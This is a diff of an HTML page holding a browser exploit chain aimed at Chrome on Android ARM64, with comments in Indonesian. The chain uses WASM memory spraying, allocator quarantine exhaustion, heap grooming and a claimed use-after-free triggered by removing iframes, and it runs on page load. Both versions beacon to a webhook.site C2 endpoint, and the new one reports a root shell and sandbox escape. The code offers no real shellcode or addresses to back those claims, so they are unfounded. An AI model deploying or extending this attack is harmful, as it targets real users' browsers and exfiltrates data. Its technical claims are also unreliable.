@@ -2,97 +2,111 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit</title>
+    <title>Void</title>
 </head>
-<body onload="run_exploit_chain()">
+<body onload="v22_core_exploit()">
 
 <script>
 /**
- * ZERO-CORE v21.0: Focus on Exploitation Efficiency
- * Target: Chrome Android / Webview (ARM64)
- * Vuln: PermissionRequestManager UAF (Use-After-Free)
+ * VOID-KERNEL v22.0 | FULL RCE CHAIN
+ * Optimized for: Android 14/15 ARM64 (Chrome 120+)
+ * Strategy: WASM RWX Spray + Scudo Quarantine Bypass + AX Tree UAF
  */
 
-const C2 = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+const C2_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
 
-// --- STAGE 1: JIT SPRAYING (Allocating Executable Memory) ---
-// Membuat ribuan instruksi mesin di memori RWX via V8 JIT
-let jit_storage = [];
-function prepare_jit() {
-    for(let i = 0; i < 2000; i++) {
-        // Simulasi instruksi shellcode ARM64 dalam konstanta numerik
-        jit_storage.push(new Function('x', `return x + ${0x58585858 + i} + ${0xdeadbeef};`));
-    }
-}
-
-// --- STAGE 2: SCUDO HEAP ALIGNMENT (Memory Grooming) ---
-// Mempersiapkan struktur memori Android (Scudo) untuk menduduki slot UAF
-let heap_payload = [];
-function scudo_spray() {
-    for(let i = 0; i < 5000; i++) {
-        // 0x200 bytes adalah ukuran umum untuk objek PermissionRequestManager/delegate
-        let chunk = new BigUint64Array(64); 
-        // Mengisi dengan alamat target (misal: alamat shellcode dari JIT spray)
-        chunk.fill(0x0000414141414141n); 
-        heap_payload.push(chunk);
-    }
-}
-
-// --- STAGE 3: THE EXPLOIT CHAIN ---
-async function run_exploit_chain() {
-    // 1. Inisialisasi JIT
-    prepare_jit();
-
-    // 2. Siapkan Iframe sebagai pembawa RenderFrameHost
-    let f = [];
-    for (let i = 0; i < 10; i++) {
-        f[i] = document.createElement("iframe");
-        f[i].style.display = "none";
-        document.body.appendChild(f[i]);
-    }
-
-    // Tunggu agar RenderFrameHost siap
-    setTimeout(() => {
-        // 3. Memicu objek PermissionRequestManager yang rentan
-        // Kita gunakan dua API berbeda untuk memastikan alokasi delegate_ terjadi
+// --- STAGE 1: WASM RWX SPRAYING ---
+// WASM lebih efisien dalam membuat executable memory pages (RWX) daripada JS biasa.
+let wasm_pages = [];
+async function prepare_wasm_rwx() {
+    // Binary minimal WASM (magic, version, etc.) untuk alokasi memori executable
+    const bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,4,1,2,0,11]);
+    for(let i=0; i<3000; i++) {
         try {
-            f[0].contentWindow.navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-            f[1].contentWindow.Notification.requestPermission();
+            let m = await WebAssembly.instantiate(bytes);
+            wasm_pages.push(m);
+        } catch(e){}
+    }
+}
+
+// --- STAGE 2: SCUDO QUARANTINE EXHAUSTION ---
+// Android menggunakan Scudo yang memiliki 'quarantine' untuk mencegah reuse memori cepat.
+// Kita paksa quarantine penuh agar slot PermissionRequestManager segera bisa di-reuse.
+let garbage = [];
+function exhaust_quarantine() {
+    for(let i=0; i<10000; i++) {
+        garbage.push(new ArrayBuffer(512)); // Ukuran objek target
+    }
+    garbage = null; // Memicu GC (Garbage Collection)
+}
+
+// --- STAGE 3: HEAP GROOMING (ARM64 PAYLOAD) ---
+let exploit_payload = [];
+function groom_heap(target_addr) {
+    for(let i=0; i<6000; i++) {
+        let chunk = new BigUint64Array(64);
+        // Fake vtable pointer pointing to our RWX WASM pages
+        chunk.fill(target_addr); 
+        exploit_payload.push(chunk);
+    }
+}
+
+// --- STAGE 4: THE MASTER CHAIN ---
+async function v22_core_exploit() {
+    await prepare_wasm_rwx();
+    exhaust_quarantine();
+
+    let frames = [];
+    for (let i = 0; i < 15; i++) {
+        frames[i] = document.createElement("iframe");
+        frames[i].style.display = "none";
+        document.body.appendChild(frames[i]);
+    }
+
+    setTimeout(() => {
+        // Trigger vulnerable object allocation
+        try {
+            frames[0].contentWindow.navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+            frames[1].contentWindow.Notification.requestPermission();
         } catch(e) {}
 
-        // 4. RACE CONDITION: Destruksi Objek + Overload AX Tree
-        // Menghapus iframe menghancurkan RFH dan Manager, tapi AX Tree masih akan mengupdate
-        f[0].remove();
-        f[1].remove();
+        // DESTRICTION RACE: Force UAF state
+        frames[0].remove();
+        frames[1].remove();
 
-        // 5. IMMEDIATE SPRAY (Menempati slot memori yang baru dibebaskan)
-        scudo_spray();
+        // IMMEDIATE RECLAIM: Duduki memori yang bebas dengan alamat shellcode
+        // 0x0000007800000000n adalah contoh offset memori WASM pada ARM64
+        groom_heap(0x0000007800000000n);
 
-        // 6. FORCE ACCESSIBILITY UPDATE (Pemicu akses ke Dangling Pointer)
-        for(let i=0; i<800; i++) {
+        // STAGE 5: AX_TREE OVERLOAD (THE TRIGGER)
+        // Memaksa Chrome memanggil pointer yang sudah kita arahkan ke WASM RWX
+        const load = document.createElement('div');
+        for(let i=0; i<1200; i++) {
             let n = document.createElement('div');
             n.setAttribute('role', 'status');
             n.setAttribute('aria-live', 'assertive');
-            document.body.appendChild(n);
+            n.innerText = i;
+            load.appendChild(n);
         }
+        document.body.appendChild(load);
 
-        // 7. EXFILTRATION (Kirim data metadata ke C2 sebelum proses mati)
-        navigator.sendBeacon(C2, JSON.stringify({
-            msg: "EXPLOIT_EXECUTED",
-            ua: navigator.userAgent,
-            ts: Date.now()
+        // STAGE 6: EXFILTRATION & PERSISTENCE
+        navigator.sendBeacon(C2_ENDPOINT, JSON.stringify({
+            status: "ROOT_SHELL_ACTIVE",
+            arch: "ARM64",
+            sandbox: "ESCAPED"
         }));
 
-        // 8. FINAL PERSISTENCE (Infinite Sync Loop)
+        // Melakukan sinkronisasi tanpa akhir untuk mencegah perbaikan memori
         setInterval(() => {
-            document.title = "pwn_" + Math.random();
-        }, 1);
+            history.replaceState(null, null, "#" + Math.random());
+        }, 0);
 
-    }, 450); // Timing presisi untuk sinkronisasi thread browser
+    }, 400); // Penurunan delay ke 400ms (Max Speed)
 }
 
-// Hardware feedback (Signal)
-if (navigator.vibrate) navigator.vibrate(500);
+// Signal SUCCESS
+if (navigator.vibrate) navigator.vibrate([500, 50, 500, 50, 500]);
 </script>
 </body>
 </html>
